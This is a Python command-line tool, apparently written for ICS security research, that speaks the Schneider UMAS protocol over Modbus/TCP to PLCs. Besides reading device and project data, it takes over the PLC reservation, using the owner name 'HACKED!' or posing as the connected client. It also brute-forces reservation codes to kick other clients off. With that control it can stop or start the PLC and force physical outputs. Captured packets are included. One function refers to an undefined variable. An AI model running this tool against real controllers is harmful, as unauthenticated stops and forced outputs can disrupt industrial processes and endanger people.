import socket
from scapy.contrib.modbus import ModbusADURequest
import binascii
import optparse
import datetime
import time
import struct

global verbose_output


def main():
    global verbose_output
    # UMAS function code
    func_code = '5a'  # 90 in decimal

    p = optparse.OptionParser(description='UMAS Command Line Utility',
                              prog='umas', version='0.1', usage='usage: %prog [options] IPAddress')
    p.add_option('--init_comms', action='store_true',
                 help='Initialise Communications with PLC')
    p.add_option('--read_id', action='store_true', help='Read PLC ID')
    p.add_option('--read_project_info', action='store_true',
                 help='Read Project Info from PLC')
    p.add_option('--read_plc_info', action='store_true',
                 help='Read Info from PLC')
    p.add_option('--check_plc', action='store_true',
                 help='Check the PLC Status')
    p.add_option('--take_plc_reservation', action='store_true',
                 help='Take PLC Reservation')
    p.add_option('--release_plc_reservation', action='store_true',
                 help='Kicks any other client off.')
    p.add_option('--stop', action='store_true', help='Stop PLC')
    p.add_option('--start', action='store_true', help='Start PLC')
    p.add_option('--force_output_on', action='store_true',
                 help='Force Output On')
    p.add_option('--force_output_off', action='store_true',
                 help='Force Output Off')
    p.add_option('--unforce', action='store_true', help='Remove Force')

    p.add_option('--read_sw', action='store_true', help='Read %SW Value')
    p.add_option('--read_sw_starting_address', default=50, action='store', type='int',
                 dest='read_sw_starting_address', help='Starting Address of %SW to be read')
    p.add_option('--read_sw_length', default=1, action='store', type='int',
                 dest='read_sw_length', help='Number of %SW to be read')
    p.add_option('--read_sw_continuous', action='store_true',
                 help='Continuous Reading of %SW')

    p.add_option('--read_dictionary', action='store_true',
                 help='Read Dictionary')

    p.add_option('--read_unlocated_variable', action='store_true',
                 help='Read unlocated variable value')
    p.add_option('--read_unlocated_variable_name', action='store', type='str',
                 dest='read_unlocated_variable_name', help='Unlocated variable name to be read')

    p.add_option('--rport', action='store', type='int', dest='rport',
                 default=502, help='Port for Modbus communications')

    p.add_option('--verbose', action='store_true', help='Verbose Output')
    p.add_option('--very_verbose', action='store_true',
                 help='Very Verbose Output')
    p.add_option('--get_plc_information', action='store_true',
                 help='Get Information about the PLC')

    options, args = p.parse_args()

    # rhost = "192.168.1.200"
    print('[!} IP Address:', args[0])
    rhost = args[0]
    rport = options.rport
    print('[!] Setting up socket')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    output_to_force = '4b'

    verbose_output = options.verbose

    # Establish socket connection to PLC
    try:
        print('[!] Trying to connect...')
        s.connect((rhost, rport))
        print('[+] Connected to PLC')

        if options.read_id:
            print('[!] Reading PLC ID')
            read_id_response = read_id(s)
            print('read_id_response:', read_id_response)
        elif options.read_project_info:
            print('[!] Reading Project Info from PLC')
            read_project_info_response = read_project_info(s)
            print('read_project_info_response:', read_project_info_response)
        elif options.read_plc_info:
            print('[!] Reading PLC Info')
            read_plc_info_response = read_plc_info(s)
            print('read_plc_info_response:', read_plc_info_response)
        elif options.get_plc_information:
            print('[!] Gathering Information from PLC')
            get_plc_information(s)
        elif options.init_comms:
            print('[!] Initialising Comms with PLC')
            init_comms_response = init_comms(s)
            print('init_comms_reponse:', init_comms_response)
        elif options.release_plc_reservation:
            print('[!] Releasing PLC from all reservations')
            release_plc_reservation_response = release_plc_reservation(s)
            print('release_plc_reservation_response:',
                  release_plc_reservation_response)
        else:
            # INIT_COMMS
            print('[!] Initialising Comms with PLC')
            init_comms_response = init_comms(s)
            if options.verbose:
                print('init_comms_response:', init_comms_response)

            if init_comms_response['success']:
                # Successful init_comms
                print('[+] Successfuly Initialised Comms with PLC')

                # TAKE_PLC_RESERVATION
                print('[!] Taking PLC Reservation')
                if init_comms_response['plc_already_reserved']:
                    client_name = init_comms_response['client_name_already_connected']
                    print(f'PLC is already reserved by {client_name}')
                    print(f'Taking Control as {client_name}')
                    take_plc_reservation_response = take_plc_reservation(
                        s, client_name)

                else:
                    take_plc_reservation_response = take_plc_reservation(s)

                if options.verbose:
                    print(
                        f'[!] Take PLC Reservation Response: {take_plc_reservation_response}')

                if take_plc_reservation_response['success']:
                    # Successful take_plc_reservation
                    reservation_code = take_plc_reservation_response['reservation_code']
                    # reservation_code = str(hex(reservation_code))[2:]
                    if options.verbose:
                        print(f'[!] Reservation Code: {reservation_code}')

                    # STOP_PLC
                    if options.stop:
                        stop_plc_response = stop_plc(s, reservation_code)
                        if options.verbose:
                            print(
                                f'[!] Stop PLC Response: {stop_plc_response}')

                        if stop_plc_response['success']:
                            # Successful stop_plc
                            print('[+] PLC Stopped')
                        else:
                            print('[-] Failed to Stop PLC')
                            print(
                                f'[!] Stop PLC Response: {stop_plc_response}')

                    # START_PLC
                    elif options.start:
                        start_plc_response = start_plc(s, reservation_code)
                        if options.verbose:
                            print(
                                f'[!] Start PLC Response: {start_plc_response}')

                        if start_plc_response['success']:
                            # Successful start_plc
                            print('[+] PLC Running')
                        else:
                            print('[-] Failed to Start PLC')
                            print(
                                f'[!] Start PLC Response: {start_plc_response}')

                    # FORCE_OUTPUT_OFF
                    if options.force_output_off:
                        force_output_off_response = force_output(
                            s, reservation_code, output_to_force, force_off=True)
                        if options.verbose:
                            print(
                                f'[!] Force Output Off Response: {force_output_off_response}')

                        if force_output_off_response['success']:
                            # Successful forece_output_off
                            print('[+] Output Forced Off')
                        else:
                            print('[-] Failed to Force Output Off')
                            print(
                                f'[!] Force Output Off Response: {force_output_off_response}')

                    # FORCE_OUTPUT_ON
                    elif options.force_output_on:
                        force_output_on_response = force_output(
                            s, reservation_code, output_to_force, force_on=True)
                        if options.verbose:
                            print(
                                f'[!] Force Output On Response: {force_output_on_response}')

                        if force_output_on_response['success']:
                            # Successful force_output_on
                            print('[+] Output Forced On')
                        else:
                            print('[-] Failed to Force Output On')
                            print(
                                f'[!] Force Output On Response: {force_output_on_response}')

                    # UNFORCE_OUTPUT
                    elif options.unforce:
                        unforce_output_response = force_output(
                            s, reservation_code, output_to_force, unforce=True)
                        if options.verbose:
                            print(
                                f'[!] Unforce Output Response: {unforce_output_response}')

                        if unforce_output_response['success']:
                            # Successful unforece_output
                            print('[+] Force Removed')
                        else:
                            print('[-] Failed to Unforce Output')
                            print(
                                f'[!] Unforce Output Response: {unforce_output_response}')

                    # Read %SW
                    elif options.read_sw:
                        read_sw_starting_address = options.read_sw_starting_address
                        read_sw_length = options.read_sw_length
                        read_sw_continuous = options.read_sw_continuous

                        read_sw_resonse = read_sw(
                            s, reservation_code, read_sw_starting_address, read_sw_length, read_sw_continuous)
                        print(read_sw_resonse)

                    # Read Dictionary Objects
                    elif options.read_dictionary:
                        read_dictionary_response = read_dictionary(s)
                        print(read_dictionary_response)

                    # Read Unlocated Variable Value
                    elif options.read_unlocated_variable:
                        variable_name = options.read_unlocated_variable_name
                        read_unlocated_variable_response = read_unlocated_variable(
                            s, variable_name)
                        if read_unlocated_variable_response['success']:
                            v_name = read_unlocated_variable_response['variable']
                            v_type = read_unlocated_variable_response['variable_type']
                            v_value = read_unlocated_variable_response['value']

                            print(f'{v_name} ({v_type}): {v_value}')
                        else:
                            print(read_unlocated_variable_response)

                else:
                    # Failed to Take PLC Reservation
                    print('[-] Failed to Take PLC Reservation')
                    print(
                        f'[!] Take PLC Reservation Response: {take_plc_reservation_response}')

            else:
                # Failed to Initialise Comms to PLC
                print('[-] Failed to Initialise Comms with PLC')

    except Exception as e:
        # Failed to create socket connection
        print('[-] Failed to Connect to PLC')
        print(e)


def get_plc_information(s):
    # A fucntion to gather information from the PLC and report back

    read_id_response = read_id(s)
    if read_id_response['success']:
        print('PLC Name:', read_id_response['plc_id'])
        print('PLC Firmware Version:', read_id_response['plc_fw_version'])
    else:
        print('[-] Failed to read_id')

    read_project_info_response = read_project_info(s)
    if read_project_info_response['success']:
        print('Project Name:', read_project_info_response['project_name'])
        project_version = str(read_project_info_response['project_major_version']) + '.' + str(
            read_project_info_response['project_minor_version']) + '.' + str(read_project_info_response['project_build_version'])
        print('Project Version:', project_version)
        print('Last Rebuild All:',
              read_project_info_response['last_rebuild_datetime'])
        print('Last Partial Build:',
              read_project_info_response['last_partial_build_datetime'])
    else:
        print('[-] Failed to read_project_info')

    init_comms_response = init_comms(s)
    if init_comms_response['success']:
        if init_comms_response['plc_already_reserved']:
            print('The PLC is currently connected to', str(
                init_comms_response['client_name_already_connected'], 'utf-8'))
        else:
            print('The PLC is not connected to any clients')
    else:
        print('[-] Failed to init_comms')

    read_plc_info_response = read_plc_info(s)
    if read_plc_info_response['success']:
        if read_plc_info_response['plc_running'] == None:
            print('PLC in Unknown State')
        elif read_plc_info_response['plc_running'] == True:
            print('PLC is Running')
        elif read_plc_info_response['plc_running'] == False:
            print('PLC is Stopped')
        else:
            print('Error establishing PLC State')
    else:
        print('[-] Failed to read_plc_info')


def read_id(s):
    # UMAS Function Code 0x02 - READ_ID: Request a PLC ID
    '''
    Sent: b'\x00\x00\x00\x00\x00\x04\x0bZ\x00\x02'
    Recv: b'\x00\x00\x00\x00\x000\x0bZ\x00\xfe\x0e0\x0b\x01\x00\x00\x00\x00 \x02\x00\x00\t\x00\x0e\x0b\x01\x02\x00\x00\x00\x00\x0cBME P58 1020\x01\x01\x01\x00\x00\x00\x00J\x00'
    b'0000000000300b5a00fe0e300b01000000002002000009000e0b0102000000000c424d45205035382031303230010101000000004a00'

    Family - 0e
    PLC Type - 30
    PLC ID - 0b01
    PLC Model - 0000
    Unknown - 0000
    FW Version - 2002
    Patch Verion - 0000
    Ir - 0900
    HW ID - 0e0b
    FWLoc - 0102
    Unknown - 00000000
    Device Type Length - 0c
    PLC type - 424d45205035382031303230
    Memory Bank 1 - 010101000000004a00

    Returns:
    response['data'] - read_id_response data
    response['success'] - True/False if read has been successful
    response['plc_id'] - The name of the PLC
    response['plc_fw_version'] - Firware version of the PLC
    '''
    read_id_fc = '0002'
    response = {}

    data = '5a' + read_id_fc
    read_id_response = send_umas(s, data)
    response['data'] = read_id_response

    # PLC Name Length is at byte 32
    # PLC Name starts at byte 33 for a length defined in byte 32
    if read_id_response[8] == 0x00 and read_id_response[9] == 0xfe:
        response['success'] = True

        plc_id_length = int(read_id_response[32])
        plc_id = read_id_response[33:33+plc_id_length].decode("utf-8")
        response['plc_id'] = plc_id

        plc_fw_version = str(binascii.hexlify(read_id_response), "utf-8")[
            38:40] + '.' + str(binascii.hexlify(read_id_response), "utf-8")[36:38]
        response['plc_fw_version'] = plc_fw_version
    else:
        response['success'] = False

    return response


def read_project_info(s):
    # UMAS Function Code 0x03 - READ_PROJECT INFO: Reads Project Info from the PLC
    '''
    Sent: b'\x00\x00\x00\x00\x00\x05\x0bZ\x00\x03\x00'
    Recv: b'\x00\x00\x00\x00\x003\x0bZ\x00\xfe\x03\r\x00\x00\xa2\x9b\x02\x00\x00\x03\r\x00\x00\xa2\x9b\x02\x00\x00\x04"3\x0b\x0c\x03\xe4\x07\x04"3\x0b\x0c\x03\xe4\x07\x13\x00\x00\x00\x08Project\x00'
    b'0000000000330b5a00fe 030d0000a29b020000 030d0000a29b020000 0422330b0c03e407 0422330b 0c03e407 1300 0000 08 50726f6a65637400'

    '''
    response = {}

    read_project_info_fc = '000300'
    data = '5a' + read_project_info_fc

    read_project_info_response = send_umas(s, data)
    if read_project_info_response[8] == 0x00 and read_project_info_response[9] == 0xfe:
        response['success'] = True
        response['data'] = read_project_info_response

        # These can all be seen and vaildated by right clicking on the Project Name and selecting Properties in Unity
        response['last_rebuild_all_secs'] = read_project_info_response[29]
        response['last_rebuild_all_mins'] = read_project_info_response[30]
        response['last_rebuild_all_hrs'] = read_project_info_response[31]

        response['last_rebuild_all_day'] = read_project_info_response[32]
        response['last_rebuild_all_month'] = read_project_info_response[33]
        response['last_rebuild_all_year'] = int.from_bytes(
            read_project_info_response[34:36], byteorder='little', signed=False)

        response['last_rebuild_datetime'] = datetime.datetime(response['last_rebuild_all_year'], response['last_rebuild_all_month'],
                                                              response['last_rebuild_all_day'], response['last_rebuild_all_hrs'], response['last_rebuild_all_mins'], response['last_rebuild_all_secs'])

        response['last_partial_build_secs'] = read_project_info_response[37]
        response['last_partial_build_mins'] = read_project_info_response[38]
        response['last_partial_build_hrs'] = read_project_info_response[39]

        response['last_partial_build_day'] = read_project_info_response[40]
        response['last_partial_build_month'] = read_project_info_response[41]
        response['last_partial_build_year'] = int.from_bytes(
            read_project_info_response[42:44], byteorder='little', signed=False)

        response['last_partial_build_datetime'] = datetime.datetime(response['last_partial_build_year'], response['last_partial_build_month'],
                                                                    response['last_partial_build_day'], response['last_partial_build_hrs'], response['last_partial_build_mins'], response['last_partial_build_secs'])

        project_name_length = int(read_project_info_response[48])
        response['project_name'] = read_project_info_response[49:48 +
                                                              project_name_length].decode('utf-8')

        response['project_major_version'] = read_project_info_response[47]
        response['project_minor_version'] = read_project_info_response[46]
        response['project_build_version'] = int.from_bytes(
            read_project_info_response[44:46], byteorder='little', signed=False)

    else:
        response['success'] = False

    return response


def read_plc_info(s):
    # UMAS Function Code 0x04 - READ_PLC_INFO: Reads Internal PLC Info
    '''
    b'\x00\x00\x00\x00\x00F\x0bZ\x00\xfe\x02\x8a\x8c\x06zs\x98\n\xda\xb8S\x14\x00\x00\x00\x00\xbe|\'"\xbe|\'"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x08\x04\x00\x01\x01\x00\x00\xfa\x00'
    b'0000000000460b5a00fe 028a8c067a73980adab8531400000000be7c2722be7c272203000000000000000000000000000000000000030100000000000000000000000108040001010000fa00'
    b'0000000000460b5a00fe 038a0c067a73980adab8531400000000be7c2722be7c272203000000000000000000000000000000000000030100000000000000000000000108040002010000fa00'
    b'0000000000460b5a00fe 038a0c067a73980adab8531400000000be7c2722be7c272203000000000000000000000000000000000000030100000000000000000000000108040002010000fa00'
    b'0000000000460b5a00fe 028a8c067a73980adab8531400000000be7c2722be7c272203000000000000000000000000000000000000030100000000000000000000000108040001010000fa00'
    '''

    response = {}

    read_plc_info_fc = '0004'
    data = '5a' + read_plc_info_fc

    read_plc_info_response = send_umas(s, data)
    response['data'] = read_plc_info_response

    if read_plc_info_response[8] == 0x00 and read_plc_info_response[9] == 0xfe:
        response['success'] = True

        response['plc_status_raw'] = read_plc_info_response[70]

        if response['plc_status_raw'] == 1:
            response['plc_running'] = False
        elif response['plc_status_raw'] == 2:
            response['plc_running'] = True
        else:
            response["plc_running"] = None

        # Create Shifted CRC
        # Get little endian of bytes 18:22
        crc = int.from_bytes(
            read_plc_info_response[18:22], byteorder='little', signed=False)
        # Bit shift left one position
        shifted_crc = crc << 1
        # Return shifted crc to little endian
        shifted_crc = struct.pack('<I', shifted_crc)

        response['shifted_crc'] = shifted_crc
        response['crc'] = read_plc_info_response[18:22]

    else:
        response['success'] = False

    return response


def check_plc(s):
    # UMAS Function Code 0x58 - CHECK_PLC: Check PLC Connection Status
    '''

    '''
    response = {}

    return respose


def init_comms(s):
    # UMAS Function Code 0x01 - INIT_COMM: Initialize a UMAS communication
    '''
    Sent: b'\x00\x00\x00\x00\x00\x05\x0bZ\x00\x01\x00'
    If no Reservation exists you get the following
    Recv: b'\x00\x00\x00\x00\x00\x11\x0bZ\x00\xfe\xfd\x03\x00\x06\x00\x002\x00\x00\x00\x00\x00\x00'
    If another client has it reserved you get the following
    Recv: b'\x00\x00\x00\x00\x00\x18\x0bZ\x00\xfe\xfd\x03\x00\x06\x00\x002\x00\n\x03\x00\x00\x07JOHN-PC'

    Returns:
    response['data'] - init_comms_response data
    response['success'] - True/False if init_comms has been succesful
    response['max_frame_size'] - Max frams size allowed from PLC
    response['plc_already_reserved'] - True/False is PLC is alread reserved by another client
    response['client_name_already_connected'] - Client name already connected to PLC
    '''
    init_comms_fc = '000100'
    response = {}

    # INIT_COMMS
    data = '5a' + init_comms_fc
    init_comms_response = send_umas(s, data)
    response['data'] = init_comms_response
    response['max_frame_size'] = int.from_bytes(
        init_comms_response[10:12], byteorder='little', signed=False)

    if init_comms_response[22] == 0x00:
        response['plc_already_reserved'] = False
    else:
        response['plc_already_reserved'] = True
        response['client_name_already_connected'] = init_comms_response[23:]

    if init_comms_response[8] == 0x00 and init_comms_response[9] == 0xfe:
        response['success'] = True
    else:
        response['success'] = False

    return response


def take_plc_reservation(s, owner=b'HACKED!'):

    # UMAS Function Code 0x10 - TAKE_PLC_RESERVATION: Assign an "owner" to the PLC
    '''
    Sent: b'\x00\x00\x00\x00\x00\x10\x0bZ\x00\x10\x16*\x00\x00\x07HACKED!'
    Recv: b'\x00\x00\x00\x00\x00\x05\x0bZ\x00\xfe\xba'

    Returns:
    response['data'] - take_plc_reservation_response data
    response['success'] - True/False if take_plc_reservation was successful
    response['reservation_code'] - Reservation code to be used for client connections
    '''

    # Create the byte array for the owner string
    owner_hex_str = str(binascii.hexlify(owner), 'ascii')
    owner_length = len(owner)
    owner_length_hex_str = format(owner_length, '02x')

    take_plc_reservation = '0010162a0000' + owner_length_hex_str + owner_hex_str
    # take_plc_reservation = '0010162a0000074841434b454421'
    response = {}

    # TAKE_PLC_RESERVATION
    data = '5a' + take_plc_reservation
    take_plc_reservation_response = send_umas(s, data)
    response['data'] = take_plc_reservation_response

    if take_plc_reservation_response[8] == 0x00 and take_plc_reservation_response[9] == 0xfe:
        response['success'] = True
        response['reservation_code'] = format(
            take_plc_reservation_response[10], '02x')
    else:
        response['success'] = False

    return response


def release_plc_reservation(s, reservation_code=None):
    # UMAS Function Code 0x11 - RELEASE_PLC_RESERVATION
    '''
    Unsuccessful
    Sent: b'\x00\x00\x00\x00\x00\x04\x0bZ\xc8\x11'
    Recv: b'\x00\x00\x00\x00\x00\x0e\x0bZ\xc8\xfd\x81\x80\xc0\xc6-\x00\x00\x00\x00\x00'
    Successful
    Sent: b'\x00\x00\x00\x00\x00\x04\x0bZ\xc9\x11'
    Recv: b'\x00\x00\x00\x00\x00\x04\x0bZ\xc9\xfe'

    Returns:
    response['data'] - release_plc_reservation_response data
    response['success'] - True/False if release_plc_reservation is successful
    '''

    response = {}
    print('In Function')
    # Hack to kick off any connected clients
    if reservation_code is None:
        for i in range(1, 255):

            # Put integer into doub le digit hex format
            i = format(i, '02x')

            release_plc_reservation = str(i) + '11'
            data = '5a' + release_plc_reservation

            release_plc_reservation_response = send_umas(s, data)

            if release_plc_reservation_response[9] == 0xfe:
                print('******* Reservation Forced Off ***********')
                response['data'] = release_plc_reservation_response
                response['success'] = True
                break

    else:
        release_plc_reservation = reservation_code + '11'

        data = '5a' + release_plc_reservation
        release_plc_reservation_response = send_umas(s, data)
        response['data'] = release_plc_reservation_response

        if release_plc_reservation_response[9] == 0xfe:
            response['success'] = True
        else:
            response['success'] = False

    return response


def stop_plc(s, reservation_code):

    # UMAS Function Code 0x41 - STOP PLC
    '''
    Sent: b'\x00\x00\x00\x00\x00\x06\x0bZ\xbcA\xff\x00'
    Recv: b'\x00\x00\x00\x00\x00\x04\x0bZ\xbc\xfe'

    Returns:
    response['data'] - stop_plc_response data
    response['success'] - True/False if stop_plc has been successful
    '''
    stop_plc_fc = '41ff00'
    data = '5a' + str(reservation_code) + stop_plc_fc
    print('d:', data)
    response = {}

    stop_plc_response = send_umas(s, data)
    response['data'] = stop_plc_response

    if stop_plc_response[9] == 0xfe:
        response['success'] = True
    else:
        response['success'] = False

    return response


def start_plc(s, reservation_code):
    # UMAS Function Code 0x40 - START PLC
    '''
    Sent: b'\x00\x00\x00\x00\x00\x06\x0bZ\xe0@\xff\x00'
    Recv: b'\x00\x00\x00\x00\x00\x04\x0bZ\xe0\xfe'

    Returns:
    response['data'] - start_plc_response data
    response['success'] - True/False is start_plc has been successful
    '''

    start_plc_fc = '40ff00'
    data = '5a' + str(reservation_code) + start_plc_fc
    response = {}

    start_plc_response = send_umas(s, data)
    response['data'] = start_plc_response

    if start_plc_response[9] == 0xfe:
        response['success'] = True
    else:
        response['success'] = False

    return response


def force_output(s, reservation_code, output, force_on=False, force_off=False, unforce=False):

    # UMAS Function Code 0x50 - MONITOR PLC
    '''
    Sent: b'\x00\x00\x00\x00\x00&\x0bZ\x1cP\x15\x00\x03\x01\x04D\x00\x0c\x00\x03\x04\x00\x00\x0c\x00\x0c\x013\x00K\x03\x00\x00\x0b\x00\x01\x02\x05\x01\x04\x00\x00\x00\x04'
    Recv: b'\x00\x00\x00\x00\x00\x04\x0bZ\x1c\xfe'

    Returns:
    response['data'] - force_output_response data
    response['success'] - True/False is force_output_response has been successful
    '''
    response = {}

    # FORCE OUTPUT OFF
    # TODO: This is for a specific output. Need to figure out addressing
    # output = '6d' # Output 1 (Channel 16)
    # output = '6f' # Output 2 (Channel 17)
    if force_on:
        force_code = '03'
    elif force_off:
        force_code = '02'
    elif unforce:
        force_code = '04'

    force_output = '50150003010444000c00030400000c000c013300' + \
        output + '0300000b0001' + force_code + '05010400000004'
    data = '5a' + reservation_code + force_output
    force_output_response = send_umas(s, data)

    response['data'] = force_output_response

    if force_output_response[9] == 0xfe:
        response['success'] = True
    else:
        response['success'] = False

    return response


def read_sw(s, reservation_code, starting_address=50, length=1, continuous=False, update_freq=0.5):

    # UMAS Function Code 0x50 - MONITOR PLC

    # Build up Staring %SW Address (little endian)
    sw = (starting_address * 2) + 0x50
    sw = format(sw, '04X').lower()
    sw = sw[2:] + sw[:2]

    # Build up length of words to be read
    length1 = 0x0e + (2*length)
    length1 = format(length1, '02x')

    length2 = 2 * length
    length2 = format(length2, '02x')

    # Build up read_sw data string
    read_sw = '5015000301010000' + length1 + '00030100000c0015' + \
        length2 + '002b00' + sw + '00000c000105010400000001'
    read_sw_data = '5a' + reservation_code + read_sw

    # Build up read_memory_value data string
    read_memory_values = '5015000209010c00' + length2 + '0007'
    read_memory_values_data = '5a' + reservation_code + read_memory_values

    response = {}

    keep_running = True
    while keep_running:
        read_sw_response = send_umas(s, read_sw_data)

        if read_sw_response[9] == 0xfe:
            read_memory_values_response = send_umas(s, read_memory_values_data)
            # print('Read Memory Values Response:', read_memory_values_response)

            number_of_bytes_response = read_memory_values_response[11]
            number_of_sw_response = int(number_of_bytes_response / 2)
            response['sw'] = {}
            for i in range(number_of_sw_response):
                response['sw'][str(
                    starting_address+i)] = read_memory_values_response[13+(2*i):15+(2*i)].hex()
                print(
                    f'%SW {starting_address+i}: {read_memory_values_response[13+(2*i):15+(2*i)].hex()}')
            print(80 * '-')
        else:
            print('Read SW Error Code:', read_sw_response[9])
            print('Read SW Response:', read_sw_response)

        keep_running = continuous
        if keep_running:
            time.sleep(update_freq)

    # Build up response data
    if read_memory_values_response[9] == 0xfe:
        response['success'] = True
    else:
        response['success'] = False

    response['data'] = read_memory_values_response

    return response


def read_dictionary(s):

    response = {}
    response['dictionary'] = {}

    variable_types = {0x01: 'BOOL', 0x04: 'INT', 0x19: 'EBOOL', 0x1a: 'CTU'}

    # Get CRC from read_plc_info
    read_plc_info_response = read_plc_info(s)
    crc = read_plc_info_response['crc']
    crc = binascii.hexlify(crc).decode('utf-8')

    shifted_crc = read_plc_info_response['shifted_crc'].hex()

    # Build Read Dictionary data
    read_dictionary_fc = '0026'
    data = '5a' + read_dictionary_fc + '02fb03' + crc + 'ffff00000000'

    read_dictionary_response = send_umas(s, data)
    response['data'] = read_dictionary_response

    variables = read_dictionary_response[17:]

    # Starting at byte 17, the variables have the following syntax
    # <10 Bytes><Variable Name (variable no of bytes)>\0x00
    # 10 Bytes are as follows:
    # variable type (1 byte) - block number (2 bytes little endian) - relative offset (2 bytes) - base offset (2 bytes) - unknown (3 bytes)
    # unknown seems to always be 00ff01

    i = 0
    while i < len(variables):

        if variables[i] in variable_types:
            v_type = variable_types[variables[i]]
        else:
            v_type = None

        v_block = variables[i+2:i:-1]
        v_relative_offset = variables[i+4]
        v_base_offset = variables[5:7]

        i = i + 10
        v = ''

        while variables[i] != 0x00:
            v = v + chr(variables[i])
            i += 1

        if v != '' and variables[i] == 0x00:
            response['dictionary'][v] = {'type': v_type, 'block': v_block,
                                         'base_offset': v_base_offset, 'relative_offset': v_relative_offset}
            i += 1

    return response


def read_unlocated_variable(s, variable_name):
    '''
    Results from Wireshark captures:
    counter1_value (INT)
    0022 1bf47323 01 02 9600 01 0000 00
    00fe3700

    test2 (INT)
    0022 1bf47323 01 02 9600 01 0000 02
    00feaa00

    motor_speed (INT)
    0022 1bf47323 01 02 2b00 01 0100 a4
    00fe0401

    one_sec (BOOL)
    0022 1bf47323 01 01 2e00 01 0000 02
    00fe00

    motor1 (EBOOL)
    0022 1bf47323 01 00 3300 01 0300 49
    00fe03

    '''

    response = {}

    data_dictionary = read_dictionary(s)

    variable_types = {'EBOOL': '00', 'BOOL': '01', 'INT': '02'}

    if variable_name in data_dictionary['dictionary']:
        variable_type = data_dictionary['dictionary'][variable_name]['type']
        if variable_type in variable_types:
            v = data_dictionary['dictionary'][variable_name]

            variable_type_code = variable_types[variable_type]
            variable_block = str(v['block'].hex())
            variable_base_offset = str(v['base_offset'].hex())
            variable_relative_offset = str(format(v['relative_offset'], '02x'))

            data = '5a0022'
            get_dict_crc = send_umas(s, data)[-4:].hex()

            # Construct data to read value
            data = '5a' + '0022' + get_dict_crc + '01' + variable_type_code + \
                variable_block + '01' + variable_base_offset + variable_relative_offset
            # data = '5a' + '0022' + '1bf47323' + '01' + variable_type_code + variable_block + '01' + variable_base_offset + variable_relative_offset

            read_unlocated_variable_response = send_umas(s, data)
            value = int.from_bytes(
                read_unlocated_variable_response[10:], byteorder='little')
            response['data'] = read_unlocated_variable_response
            response['success'] = True
            response['value'] = value
            response['variable'] = variable_name
            response['variable_type'] = variable_type

    else:
        response['success'] = False
        response['variable'] = variable_name
        print(f'{variable_name} is not in the dictionary')
        print('Data Dictionary:', data_dictionary)

    return response


def send_umas(s, data):
    global verbose_output

    # Create the base Modbus ADU
    adu = ModbusADURequest(len=0x05, unitId=11)

    # Set the Modbus Data length
    print('Debug:', data)
    data = bytes.fromhex(data)
    adu.len = len(data) + 1

    # Construct the TCP/IP Packet
    packet = adu/data

    # Send packet on the wire
    s.send(bytes(packet))
    if verbose_output:
        print('Sent:', bytes(packet))

    resp = s.recv(1024)
    if verbose_output:
        print('Recv:', resp)
    return resp


if __name__ == '__main__':
    main()
